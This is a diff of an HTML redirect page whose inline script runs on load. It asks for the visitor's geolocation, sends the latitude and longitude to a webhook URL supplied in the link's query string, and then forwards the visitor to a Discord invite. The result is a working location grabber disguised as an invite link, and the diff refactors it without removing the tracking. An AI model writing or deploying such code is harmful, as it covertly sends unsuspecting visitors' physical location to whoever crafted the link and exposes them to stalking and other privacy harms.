@@ -7,60 +7,69 @@
 </head>
 <body>
     <script>
-        // Get the 'webhook' URL from the query parameter
-        const urlParams = new URLSearchParams(window.location.search);
-        const webhookUrl = urlParams.get('webhook');
+        // Function to extract the 'webhook' parameter from the URL
+        function getWebhookFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('webhook');
+        }
 
-        // Function to send the location data to the webhook
-        function sendLocationToWebhook(latitude, longitude) {
-            const locationData = {
-                latitude: latitude,
-                longitude: longitude,
-                timestamp: new Date().toISOString()
-            };
-
-            // Send the location data to the provided webhook URL
+        // Function to send data to the provided webhook
+        function sendToWebhook(webhookUrl, message) {
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(locationData)
+                body: JSON.stringify({ content: message })
             }).then(response => {
                 if (response.ok) {
-                    console.log("Webhook sent successfully!");
+                    console.log("Message sent to webhook successfully!");
                 } else {
-                    console.error("Failed to send webhook.");
+                    console.error("Failed to send message to webhook.");
                 }
             }).catch(error => {
-                console.error("Error sending webhook:", error);
+                console.error("Error sending message:", error);
             });
         }
 
-        // Check if geolocation is available in the browser
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(position) {
-                // Get the latitude and longitude
-                const latitude = position.coords.latitude;
-                const longitude = position.coords.longitude;
+        // Main function to handle the geolocation and webhook sending
+        function handleRedirectAndWebhook() {
+            // Get the webhook URL from the query string
+            const webhookUrl = getWebhookFromUrl();
 
-                // Send location data to the webhook
-                if (webhookUrl) {
-                    sendLocationToWebhook(latitude, longitude);
+            // Check if webhook is available
+            if (webhookUrl) {
+                // Get the location (if available)
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(function(position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        // Create a message to send to the webhook with the location
+                        const message = `User's location: Latitude: ${latitude}, Longitude: ${longitude}`;
+
+                        // Send location data to the webhook
+                        sendToWebhook(webhookUrl, message);
+
+                        // Redirect to the Discord invite link
+                        window.location.href = "https://discord.gg/perkbios";
+                    }, function(error) {
+                        console.error("Geolocation error:", error);
+                        // Redirect to Discord if geolocation fails
+                        window.location.href = "https://discord.gg/perkbios";
+                    });
+                } else {
+                    console.log("Geolocation is not supported by this browser.");
+                    // Redirect to Discord if geolocation is not supported
+                    window.location.href = "https://discord.gg/perkbios";
                 }
-
-                // Redirect to the Discord invite link
-                window.location.href = "https://discord.gg/perkbios";
-            }, function(error) {
-                console.error("Geolocation error:", error);
-                // If there is an error, still redirect to the Discord invite
-                window.location.href = "https://discord.gg/perkbios";
-            });
-        } else {
-            console.log("Geolocation is not supported by this browser.");
-            // If geolocation isn't supported, still redirect to the Discord invite
-            window.location.href = "https://discord.gg/perkbios";
+            } else {
+                console.error("No webhook URL found in the query string.");
+            }
         }
+
+        // Call the main function when the page loads
+        handleRedirectAndWebhook();
     </script>
 </body>
 </html>
